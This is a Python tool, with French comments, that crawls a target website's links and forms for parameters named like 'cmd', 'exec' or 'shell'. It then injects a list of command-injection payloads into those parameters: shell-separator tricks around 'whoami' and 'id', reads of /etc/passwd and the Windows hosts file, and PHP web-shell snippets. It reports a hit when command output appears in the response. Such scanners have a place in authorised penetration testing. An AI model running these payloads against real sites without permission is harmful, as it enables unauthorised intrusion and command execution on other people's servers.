import requests
from pprint import pprint
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re
import time

#  Liste des paramètres suspects liés à l'exécution de commandes (potentiellement vulnérables à RCE)
RCE_KEYS = [
    "cmd", "exec", "command", "query", "shell", "ping", "process",
    "run", "execute", "operation", "function", "task", "system", "os",
    "Cmd", "Exec", "Command", "Query", "Shell", "Ping", "Process",
    "Run", "Execute", "Operation", "Function", "Task", "System", "Os"
]

#  Payloads pour tester l'exécution de code (Linux et Windows)
RCE_PAYLOADS = [
    "whoami", "id", "uname -a", "ls -la", "cat /etc/passwd", "echo RCE_TEST",
    "ping -c 1 127.0.0.1", "dir", "type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "<?php system('whoami'); ?>", ";whoami;", "|whoami;", "`whoami`", "$(whoami)",
    "||whoami", "&&whoami", ";id;", "|id;", "`id`", "$(id)", "||id", "&&id",
    ";dir;", "|dir;", "`dir`", "$(dir)", "||dir", "&&dir", ";type C:\\Windows\\System32\\drivers\\etc\\hosts;",
    "|type C:\\Windows\\System32\\drivers\\etc\\hosts;", "`type C:\\Windows\\System32\\drivers\\etc\\hosts;`",
    "$(type C:\\Windows\\System32\\drivers\\etc\\hosts)", "||type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "&&type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "<?php system($_GET['c']); ?>&c=whoami",
    "<?php passthru($_GET['c']); ?>&c=whoami",
    "<?php exec($_GET['c']); ?>&c=whoami"
]

def find_rce_in_urls(target, session=None):
    """Analyse les liens pour détecter les paramètres RCE potentiels."""
    if not session:
        session = requests.Session()
        session.verify = False
    try:
        print(f"[!]~] Recherche de paramètres RCE dans {target}...")
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        detected_params = []
        if soup:
            print(f"[!]~] Lien trouvé dans {target}")
        for link in soup.find_all('a', href=True):
            
            url = link['href']
            parsed_url = urlparse(url)
            if parsed_url.query:
                print(f"[!]~] Paramètres trouvés dans {urljoin(target, url)}")
                params = parsed_url.query.split("&")
                for param in params:
                    print(f"[!]~] Test de : {param}")
                    name = param.split("=")[0]
                    if name in RCE_KEYS:
                        print(f"[!!!] RCE potentiel détecté dans {urljoin(target, url)}")
                        detected_params.append({"url": urljoin(target, url), "param": name})
        return detected_params
    except requests.exceptions.RequestException as e:
        # print(f"❌ Erreur lors de la requête : {e}\n")
        # print(f"[!] Err")
        return []

def find_rce_in_forms(target, session=None):
    """Recherche les formulaires contenant des champs susceptibles d’être vulnérables à RCE."""
    if not session:
        session = requests.Session()
    session.verify = False
    try:
        print(f"[!]~] Recherche de formulaires RCE dans {target}...")
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        detected_forms = []
        for form in soup.find_all('form'):
            print(f"[!]~] Formulaire trouvé dans {target}")
            action = form.attrs.get("action", "").strip()
            method = form.attrs.get("method", "get").lower()
            inputs = {input_tag.attrs.get("name"): input_tag.attrs.get("value", "") for input_tag in form.find_all("input") if input_tag.attrs.get("name")}
            if any(param in inputs for param in RCE_KEYS):
                print(f"[!!!] RCE potentiel détecté dans {urljoin(target, action)}")
                detected_forms.append({"action": urljoin(target, action) if action else target, "method": method, "inputs": inputs})
        return detected_forms
    except requests.exceptions.RequestException as e:
        # print(f"❌ Erreur lors de la requête : {e}\n")
        # print(f"[!] Err")
        return []

def test_rce(target_url, param, method="get", session=None):
    """Injecte des commandes pour tester une éventuelle exécution de code à distance."""
    if not session:
        session = requests.Session()
    session.verify = False
    for payload in RCE_PAYLOADS:
        test_payload = f"{target_url}&{param}={payload}" if "?" in target_url else f"{target_url}?{param}={payload}"
        start_time = time.time()
        try:
            if method == "get":
                response = session.get(test_payload, timeout=5)
            else:
                response = session.post(target_url, data={param: payload}, timeout=5)
            end_time = time.time()
            response_time = end_time - start_time

            if "RCE_TEST" in response.text or "uid=" in response.text or "Microsoft Windows" in response.text:
                print(f"[!!!] RCE détectée sur {test_payload} avec le payload : {payload}")
                # print(f" RCE détectée sur {test_payload} avec le payload : {payload}")
                return {"url": test_payload, "rce_exploitable": True, "payload": payload, "response_time": response_time}
            elif response_time > 3:
                print(f"[!!!] Temps de réponse anormalement long sur {test_payload} (Temps : {response_time}s). Vérifiez manuellement.")
                # print(f"⚠️ Temps de réponse anormalement long sur {test_payload} (Temps : {response_time}s). Vérifiez manuellement.")
                return {"url": test_payload, "rce_exploitable": "Temps de réponse long", "payload": payload, "response_time": response_time}

        except requests.exceptions.RequestException as e:
            # print(f"❌ Erreur lors de la requête RCE : {e}")
            # print(f"[!] ErrRCE")
            pass
    return None

def scan_rce(target, formated_target, session=None):
    """Exécute un scan RCE sur l'URL cible."""
    print(f"\n\t==============Scan RCE sur -->{formated_target}<--  ==============\n")
    results = {"urls": [], "forms": []}

    # 1️⃣ Recherche de paramètres RCE dans les URLs
    urls_with_rce = find_rce_in_urls(target, session)
    if urls_with_rce:
        print("[+] Test RCE sur les URLs...")
        # print(" Test RCE sur les URLs...")
        for item in urls_with_rce:
            result = test_rce(item["url"], item["param"], "get", session)
            if result:
                results["urls"].append(result)

    # 2️⃣ Recherche de champs RCE dans les formulaires
    forms_with_rce = find_rce_in_forms(target, session)
    if forms_with_rce:
        print("[+] Test RCE sur les formulaires...")
        # print("\n Test RCE sur les formulaires...")
        for form in forms_with_rce:
            action = form["action"]
            method = form["method"]
            for input_name, input_value in form["inputs"].items():
                result = test_rce(action, input_name, method, session)
                if result:
                    results["forms"].append(result)

    print("\n✅ Scan RCE terminé.\n")
    
    
    print("[!][~]")
    pprint(results)
    print("[!][~]")
    
    return results